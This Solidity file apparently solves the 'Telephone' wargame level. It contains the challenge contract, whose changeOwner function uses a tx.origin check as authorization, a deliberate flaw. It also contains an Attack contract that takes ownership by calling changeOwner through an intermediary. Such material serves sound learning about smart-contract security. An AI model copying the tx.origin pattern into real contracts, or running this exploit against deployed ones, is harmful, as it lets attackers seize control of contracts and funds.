// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

/****Og Contract****/

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

/****attack Contract****/

contract Attack{
    Telephone instanceAddress;
    function checkOwner()public view returns (address){
        return instanceAddress.owner();
    }
    function attack(address _instanceAddress) public{
        instanceAddress = Telephone(_instanceAddress);
        instanceAddress.changeOwner(msg.sender);
    }
}

